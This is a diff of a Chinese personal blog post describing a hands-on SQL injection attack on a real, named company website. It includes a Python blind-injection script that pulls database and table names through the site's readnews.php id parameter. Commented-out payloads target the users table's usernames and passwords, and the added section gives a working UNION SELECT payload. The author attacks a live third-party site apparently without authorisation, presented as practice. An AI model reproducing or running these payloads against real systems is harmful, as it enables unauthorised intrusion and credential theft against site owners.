@@ -93,13 +93,13 @@
 
 
 
-<meta name="description" content="尝试了一下 还蛮有趣的">
+<meta name="description" content="这站其实有回显的 但还是选择练习下盲注">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql盲注实战">
 <meta property="og:url" content="http://Merl1ng.com/2018/03/07/sql盲注实战/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="尝试了一下 还蛮有趣的">
+<meta property="og:description" content="这站其实有回显的 但还是选择练习下盲注">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql2.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql9.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql10.PNG">
@@ -111,16 +111,19 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql15.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql17.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql18.PNG">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql3.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql4.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql5.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql6.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql8.PNG">
-<meta property="og:updated_time" content="2018-03-07T12:48:12.825Z">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql1.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql21.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql20.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql22.PNG">
+<meta property="og:updated_time" content="2018-03-07T13:28:27.900Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql盲注实战">
-<meta name="twitter:description" content="尝试了一下 还蛮有趣的">
+<meta name="twitter:description" content="这站其实有回显的 但还是选择练习下盲注">
 <meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql2.PNG">
 
 
@@ -348,7 +351,7 @@
       
 
       
-        <p>尝试了一下 还蛮有趣的<br><a id="more"></a></p>
+        <p>这站其实有回显的 但还是选择练习下盲注<br><a id="more"></a></p>
 <p>目标网站 <a href="http://www.kabelindo.co.id" target="_blank" rel="external">http://www.kabelindo.co.id</a></p>
 <p>稍微扫了一下 一堆洞。。</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql2.PNG" alt=""></p>
@@ -365,8 +368,7 @@
 <p>随手点了点页面上的连接 </p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql14.PNG" alt=""></p>
 <p>出现了熟悉的?id=<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql15.PNG" alt=""></p>
-<h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>试了下不能回显的 只能盲注</p>
-<p>尝试 ?id=21^1 ?id=20^0 发现不行</p>
+<h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>尝试 ?id=21^1 ?id=20^0 发现不行</p>
 <p>?id=21 and 1 ?id=20 and 0 回显信息不同 可以利用</p>
 <p>不放心又试了一下</p>
 <p>?id=21 and 1 ascii(substr((select database()),1,1))&gt;64</p>
@@ -379,18 +381,26 @@
 <p>换了个 ?id=2 这次回显的长多了 没重复 成功跑出</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql18.PNG" alt=""></p>
 <h3 id="跑脚本"><a href="#跑脚本" class="headerlink" title="跑脚本"></a>跑脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line">import requests</div><div class="line">flag = <span class="string">""</span></div><div class="line">url = <span class="string">"http://www.kabelindo.co.id/readnews.php?id=2 and "</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,500):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(96,127):</div><div class="line">        <span class="comment">#payload ="ascii(substr((select database()),%s,1))&gt;%s --+"%(i,j)</span></div><div class="line">        <span class="comment">#payload="ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s --+"%(i,j)</span></div><div class="line">        payload=<span class="string">"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%s,1))&gt;%s --+"</span>%(i,j)</div><div class="line">        <span class="comment">#payload="ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=database() and TABLE_NAME=''),%s,1))&gt;%s --+"%(i,j)</span></div><div class="line">        <span class="comment">#payload="ascii(substr((select group_concat(username) from users),%s,1))&gt;%s --+"%(i,j)</span></div><div class="line">        <span class="comment">#payload="ascii(substr((select group_concat(password) from users),%s,1))&gt;%s --+"%(i,j)</span></div><div class="line">        url1 = url+payload</div><div class="line">        <span class="comment">#print url1</span></div><div class="line">        s = requests.get(url=url1)</div><div class="line">        <span class="comment">#print "i:",i,"j:",j</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"Pada tahun 2013, RUPS PT Kabelindo Murni Tbk. diadakan pada tanggal 12 Juni 2013"</span> not <span class="keyword">in</span> s.content:</div><div class="line">            flag += chr(j)</div><div class="line">            <span class="built_in">print</span> flag</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
-<p>先看下列数<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql1.PNG" alt=""></p>
 <p>跑出数据库名<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql3.PNG" alt=""></p>
-<p>跑表名时 它这个表名太多 导致请求太多老是被ban<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql4.PNG" alt=""></p>
+<p>跑表名时 它这个表名太多 导致大量请求总是被ban<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql4.PNG" alt=""></p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql5.PNG" alt=""></p>
-<p>就很烦 不能用 group_concat一下跑完</p>
+<p>就很烦 不能用group_concat一下跑完</p>
 <p>只能上limit一个一个看 </p>
-<p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql6.PNG" alt=""><br>…..</p>
+<p>count(*) 可以看数量 一共有22个表</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql6.PNG" alt=""><br>……</p>
 <p>最后一个<br>payload=”ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 21,1),%s,1))&gt;%s –+”%(i,j)</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql8.PNG" alt=""></p>
-<p>一共有22个表</p>
 <p>然后类似跑字段 再跑出 用户 密码 等等 表太多了费时间就不跑了</p>
-<h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>既然是盲注 用dnslog回显应该也是可以的 还没试</p>
+<h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>既然可以盲注 借助dnslog回显应该也是可以的 还没试</p>
+<h3 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h3><p>这题直接注入还是炒鸡简单的 啥都没过滤</p>
+<p>看下列数<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql1.PNG" alt=""></p>
+<p>payload:</p>
+<p><a href="http://www.kabelindo.co.id/readnews.php?id=-1" target="_blank" rel="external">http://www.kabelindo.co.id/readnews.php?id=-1</a> union select 1,7,group_concat(table_name，0x0a),8,5 from information_schema.tables where table_schema=database() –+</p>
+<p>这里要注意一点就是它的回显位置只有中间的三个 (看对应显示出的数字)<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql21.PNG" alt=""></p>
+<p>所以要把group_concat放在中间的三个位置上 否则没回显<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql20.PNG" alt=""></p>
+<p>还有group_concat加了个 0x0a 参数是为了在页面上显示完全 否则一行显示不完 要到源代码里看全部的</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql22.PNG" alt=""></p>
+<p>当然如果是盲注不用加</p>
 
       
     </div>
@@ -585,7 +595,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找注入点"><span class="nav-number">2.</span> <span class="nav-text">寻找注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断类型"><span class="nav-number">3.</span> <span class="nav-text">判断类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跑脚本"><span class="nav-number">4.</span> <span class="nav-text">跑脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-number">5.</span> <span class="nav-text">dnslog</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找注入点"><span class="nav-number">2.</span> <span class="nav-text">寻找注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试利用"><span class="nav-number">3.</span> <span class="nav-text">尝试利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跑脚本"><span class="nav-number">4.</span> <span class="nav-text">跑脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-number">5.</span> <span class="nav-text">dnslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#直接注入"><span class="nav-number">6.</span> <span class="nav-text">直接注入</span></a></li></ol></div>
             
 
           </div>
